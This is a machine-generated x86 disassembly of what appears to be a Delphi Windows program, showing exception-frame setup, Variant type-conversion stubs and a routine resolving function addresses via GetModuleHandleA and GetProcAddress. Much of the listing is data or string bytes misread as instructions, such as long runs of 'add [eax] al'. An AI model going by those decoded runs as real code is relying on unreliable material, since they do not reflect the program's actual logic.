add ah bh
rol [ esi ] 0x1
shl al 0x46
fild [ esi ]
add [ eax ] al
add [ eax ] al
add al bh
rol [ esi ] 0x1
clc
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
hlt
add [ ecx + 0x46 ] ah
add [ eax ] al
add [ eax ] al
add ah ch
rol [ esi ] 0x1
push esp
loope r-xdata
inc esi
add [ eax - 0x21 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add ah bl
rol [ esi ] 0x1
push esp
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
fcom st1
inc esi
add [ eax - 0x1f ] dl
inc esi
add [ eax ] al
add [ eax ] al
add ah dl
rol [ esi ] 0x1
push 0x46e0
loopne r-xdata
add [ eax ] al
add [ eax ] al
loopne r-xdata
add [ eax ] al
add [ eax ] al
add al ch
rol [ esi ] 0x1
fsubr st0
inc esi
add [ eax ] al
add [ eax ] al
add ah ah
rol [ esi ] 0x1
enter 0x46df 0x0
loope r-xdata
add [ eax ] al
add [ eax ] al
add al cl
rol [ esi ] 0x1
lodsb [ esi ]
loopne r-xdata
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
mov eax 0x40046d1
loopne r-xdata
add [ eax ] al
add al dl
rol [ esi ] 0x1
push 0x46df
add [ eax ] al
add ah cl
rol [ esi ] 0x1
inc eax
loopne r-xdata
add [ eax ] al
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x63ffb92f ] dh
loope r-xdata
add [ eax ] al
add [ eax ] al
add ah al
rol [ esi ] 0x1
push esp
loopne r-xdata
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 - 0x1e0fffba ] dh
inc esi
fild [ esi ]
add [ eax ] al
add [ eax ] al
pushad
rol [ esi ] 0x1
xor al 0xdf
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_40d315
push [ fs : eax ]
mov [ fs : eax ] esp
add [ eax ] al
add [ eax ] al
add [ eax - 0x57ffb92f ] bl
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
xchg esp eax
rol [ esi ] 0x1
cmp al 0xde
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x3bffb92f ] dl
loope r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 - 0x1f6bffba ] ch
inc esi
loopne r-xdata
add [ eax ] al
add [ eax ] al
add al al
rol [ esi ] 0x1
pushfd
fild [ esi ]
add [ eax ] al
add [ eax ] al
mov esp 0x500046d1
loop r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 - 0x1d7bffba ] bl
inc esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d31c
retn
mov eax rw-data
call sub_40cd80
call sub_40c8ec
call sub_40bb54
mov eax rw-data
mov ecx 0x16
mov edx [ sub_40b62c ]
call sub_404a44
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
call sub_403fbc
mov eax rw-data
mov edx [ r-xdata ]
call sub_404f7c
mov eax rw-data
mov edx [ r-xdata ]
call sub_404f7c
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
mov ecx 0x7
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
mov ecx 0xc
mov edx [ r-xdata ]
call sub_404a44
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_403fbc
mov eax rw-data
call sub_40469c
mov eax rw-data
call sub_403fbc
inc [ rw-data ]
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 - 0x1f6fffba ] cl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x280046d1 ] cl
fiadd [ esi ]
add [ eax ] al
add [ eax ] al
nop
rol [ esi ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax + 0x280046d1 ] ch
fild [ esi ]
add [ eax ] al
add [ eax ] al
movsb [ edi ] [ esi ]
rol [ esi ] 0x1
push 0x46de
add [ eax ] al
add [ eax - 0x73ffb92f ] ah
idiv edi
add [ eax ] al
add [ eax ] al
add [ ecx + edx * 8 + 0x46 ] ah
add ah ch
sub_40d320
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40d388
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d38f
retn
mov eax sub_40ced0
call sub_403d68
mov eax r-xdata
call sub_403d90
cmp [ rw-data ] 0x0
je r-xdata
call sub_40bad0
call sub_40bbd4
call sub_40c90c
call sub_40c4a4
mov eax rw-data
mov edx r-xdata
call sub_404010
sub_40d3c0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
mov ax [ ebp + 0x18 ]
push eax
mov ax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call VariantChangeType
mov eax 0x80004001
jmp r-xdata
pop ebp
retn 0x14
sub_40d414
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d46e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404244
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40802c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d475
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d480
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d4da
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404244
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409368
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d4e1
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d4ec
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d546
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404244
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40933c
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d54d
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d558
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d5b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404244
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_40ab80
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d5b9
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d5c4
push ebp
mov ebp esp
push 0x0
push ebx
xor eax eax
push ebp
push sub_40d61e
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
call sub_404244
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0x14 ]
call sub_409394
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d625
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d630
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
xor eax eax
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_40d69d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
call sub_404244
mov eax [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
call sub_408118
and eax 0x7f
mov ebx [ eax * 4 + rw-data ]
cmp [ ebp - 0x1 ] 0x1
cmc
sbb eax eax
mov edx [ ebp + 0x14 ]
mov [ edx ] ax
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d6a4
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
sub_40d6b0
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d710
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_4092f0
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047e8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d717
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d720
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d780
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x10 ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
call sub_40a340
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x18 ]
call sub_4047e8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d787
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d790
push ebp
mov ebp esp
push 0x0
push ebx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40d7f4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0x400
je r-xdata
xor edx edx
mov [ eax ] edx
cmp [ ebp + 0x8 ] 0x1
sbb eax eax
inc eax
lea ecx [ ebp - 0x4 ]
xor edx edx
call sub_4081b4
mov edx [ ebp - 0x4 ]
mov eax [ ebp + 0x14 ]
call sub_4047e8
xor ebx ebx
mov ebx 0x80004001
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d7fb
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_40d824
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40d850
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d3c0
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3f0
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3f0
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d3fc
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d408
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d414
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d480
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d4ec
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d558
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d5c4
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d630
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d6b0
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d720
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d790
mov eax r-xdata
call sub_40d824
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40db5c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40db81
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40db88
retn
sub_40dcbc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xdd
inc eax
add [ eax + eax ] cl
jo r-xdata
popad
outsb
je r-xdata
insb
outsd
ja r-xdata
inc ebx
popad
jae r-xdata
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x70795474
outsb
jbe r-xdata
add [ edx + esi ] al
jb r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
fiadd [ eax ]
or al 0x0
inc ebp
jb r-xdata
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg esp eax
fiadd [ eax ]
or al 0x0
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
outsd
jb r-xdata
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor dh bl
inc eax
add [ eax + eax ] cl
outsd
jb r-xdata
xor dh bl
inc ebx
popad
jb r-xdata
push 0x40dd
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x23 ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xb4004076
adc eax 0x72615645
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
jns r-xdata
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
outsb
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
shl [ eax ] 0xde
ror ah 0xdd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
popad
outsb
je r-xdata
add [ edx + esi ] al
jb r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
les esi [ eax + eax * 2 ]
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc eax
add [ edx + esi + 0x40 ] bl
add [ 0x72615645 ] dl
inc ecx
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
fld [ eax ]
or al 0x0
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc eax 0x72615645
jb r-xdata
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xc0040dd
add [ eax ] al
add [ eax - 0x4bffbf8a ] bh
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
push ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
lea eax [ eax ]
add al 0xdd
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx * 8 + 0xc0040 ] al
outsb
je r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
fild [ eax ]
or al 0x0
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
outsd
jb r-xdata
inc ebp
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
add al al
xor al 0x40
add ah al
xor al 0x40
jb r-xdata
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
jb r-xdata
rcr [ edi + ebx * 8 + 0x40 ] 0x0
add [ eax ] al
jo r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
fiadd [ eax ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
fiadd [ eax ]
or al 0x0
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
outsd
jb r-xdata
je r-xdata
popad
inc eax
add [ eax + 0x40e0 ] dl
add [ eax ] al
popad
outsb
je r-xdata
popad
jb r-xdata
popad
jns r-xdata
jb r-xdata
inc ebp
add al 0x32
dec bp
insd
outsd
jb r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
add al 0x32
outsd
outsb
je r-xdata
popad
outsb
je r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
inc eax
jb r-xdata
add [ eax ] al
jb r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
add [ edx + esi ] al
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
jae r-xdata
popad
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x40 ] bl
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
inc ebp
jb r-xdata
inc eax
add [ edx + esi ] al
insd
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ edx + esi + 0x40 ] bl
add [ 0x72615645 ] dl
outsb
js r-xdata
inc eax
xor al 0x40
add [ edx + esi ] al
jne r-xdata
jo r-xdata
popad
je r-xdata
inc eax
add [ eax ] ch
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] ch
inc eax
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
outsd
jb r-xdata
dec ebp
in al 0x8b
mov ebx eax
popad
xor eax eax
push ebp
add esp 0xffffffe4
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
outsd
jb r-xdata
inc ebp
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
pop esp
dec edi
jb r-xdata
inc ebp
jb r-xdata
inc eax
add ah al
fild [ eax ]
add [ eax ] al
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
je r-xdata
inc eax
add al bh
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
loopne r-xdata
outsd
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1c5
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc eax 0x72615645
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e0 ] dl
add [ eax ] al
add [ eax - 0x4bffbf8a ] bh
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
outsd
push 0x0
xor eax eax
push ebp
push sub_40e1be
push [ fs : eax ]
rcl [ ebp - 0x75 ] 0xec
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
pop ss
inc ebp
push esi
popad
jb r-xdata
add [ eax ] al
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
jb r-xdata
inc ebp
jb r-xdata
loope r-xdata
jns r-xdata
push sub_40e257
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40feb8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_40feb8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b450
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e25e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403fe0
retn
jb r-xdata
outsd
sub_40df99
fild [ eax ]
or al 0x0
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
outsb
je r-xdata
popad
add al 0x32
outsd
add al al
xor al 0x40
add ah al
xor al 0x40
jb r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
sbb [ ebp + 0x56 ] al
popad
jb r-xdata
inc eax
add [ edx + esi ] al
insd
je r-xdata
popad
inc eax
add [ eax + 0x40e0 ] dl
add [ eax ] al
popad
add [ edx + esi + 0x40 ] bl
add [ 0x72615645 ] dl
outsb
js r-xdata
xor al 0x40
add [ edx + esi ] al
jne r-xdata
jb r-xdata
inc ebp
inc eax
add al 0x32
dec bp
insd
outsd
jb r-xdata
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
add [ eax ] ah
xor al [ eax ]
pop esp
xor al [ eax ]
adc al 0x45
push esi
popad
jb r-xdata
inc eax
jb r-xdata
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
jae r-xdata
popad
pop esp
dec edi
je r-xdata
inc eax
add al bh
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bh
loopne r-xdata
outsd
jb r-xdata
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x40 ] bl
add [ eax + eax ] cl
add [ eax ] al
mov eax 0xb4004076
xor al 0x40
add al al
xor al 0x40
add ah al
xor al 0x40
add al cl
xor al 0x40
add [ esp + esi + 0x32040040 ] bh
inc eax
inc ebp
jb r-xdata
jo r-xdata
popad
je r-xdata
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405aec
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b414
call sub_4039f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e1c5
lea eax [ ebp - 0x4 ]
call sub_403fbc
